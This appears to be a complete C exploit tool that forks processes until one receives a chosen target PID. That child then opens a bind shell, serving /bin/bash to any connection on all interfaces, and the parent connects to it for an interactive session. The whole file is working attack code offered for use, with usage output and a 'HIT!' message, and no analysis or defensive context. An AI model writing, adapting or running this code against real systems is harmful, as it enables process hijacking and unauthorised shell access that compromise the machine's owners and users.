#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pty.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <time.h>

#define FORK_ERROR -1
#define FORK_CHILD 0

int start_bind_shell(unsigned short port)
{
    char msg[16];
    int srv_sockfd, new_sockfd;
    socklen_t new_addrlen;
    struct sockaddr_in srv_addr, new_addr;

    if ((srv_sockfd = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
        return -1;
    }

    srv_addr.sin_family = PF_INET;
    srv_addr.sin_port = htons(port);
    srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(srv_sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr)) < 0) {
        return -1;
    }

    if (listen(srv_sockfd, 1) < 0) {
        return -1;
    }

    new_addrlen = sizeof(new_addr);
    new_sockfd = accept(srv_sockfd, (struct sockaddr *)&new_addr, &new_addrlen);

    if (new_sockfd < 0) {
        return -1;
    }

    close(srv_sockfd);
    dup2(new_sockfd, 2);
    dup2(new_sockfd, 1);
    dup2(new_sockfd, 0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}

void enter_bind_shell(unsigned short port)
{
    int fd;
    struct sockaddr_in addr;
    struct timeval tv;
    fd_set rset, rset_work;

    tv.tv_sec = 2;
    tv.tv_usec = 0;

    FD_ZERO(&rset);

    fd = socket(AF_INET, SOCK_STREAM, 0);

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
    addr.sin_port = htons(port);

    FD_SET(fd, &rset);
    FD_SET(0, &rset);

    connect(fd, (struct sockaddr*)&addr, sizeof(addr));

    while(1)
    {
        char rbuf[2048] = {0,};
        char sbuf[2048] = {0,};
        rset_work = rset;
        switch(select(fd+1, &rset_work, NULL, NULL, &tv))
        {
            case -1:
                printf("* failed to select\n");
                break;

            case 0:
                break;

            default:
                if(FD_ISSET(fd, &rset_work))
                {
                    read(fd, rbuf, sizeof(rbuf));
                    fprintf(stderr, "%s", rbuf);
                }
                else if(FD_ISSET(0, &rset_work))
                {
                    int n;
                    n = read(0, sbuf, sizeof(sbuf));
                    write(fd, sbuf, n);    
                }
                break;
        }
    }
}

int main(int argc, char **argv)
{
    int target_ppid;
    int pid;
    int st, et;
    int min_pid = 65535;
    int max_pid = 0;
    int status;
    int inpid;
    unsigned short bind_port;

    if(argc!=2)
    {
        printf("* Usage: %s target_ppid\n", argv[0]);
        return 0;
    }

    target_ppid = atoi(argv[1]);
    bind_port = random()%40000 + 1024;

    st = time(NULL);
    while(1)
    {
        //pid = forkpty(&fd, NULL, NULL, NULL);
        pid = fork();
        switch(pid)
        {
            case FORK_ERROR:
                printf("* failed to fork()\n");
                return -1;

            case FORK_CHILD:

                if(getpid()!=(target_ppid))
                    return 0;
                
                setsid();
                start_bind_shell(bind_port);
                return 0;

            default:
                if(pid>max_pid)
                    max_pid = pid;
                if(pid<min_pid)
                    min_pid = pid;

                if(pid==(target_ppid))
                {
                    char cmd[256];
                    printf("* HIT!, child's pid is %d\n", pid);
                    printf("* Max PID : %d\n", max_pid);
                    printf("* Min PID : %d\n", min_pid);
                    printf("* Elapsed Time : %d\n", (int)(time(NULL)-st));

                    sleep(1);

                    printf("* start shell environment!\n");
                    printf("* ^C for exiting shell.\n");
                    enter_bind_shell(bind_port);
                    wait(&status);
                    return 0;
                }
                wait(&status);
                break;
        }
    }

    return 0;
}
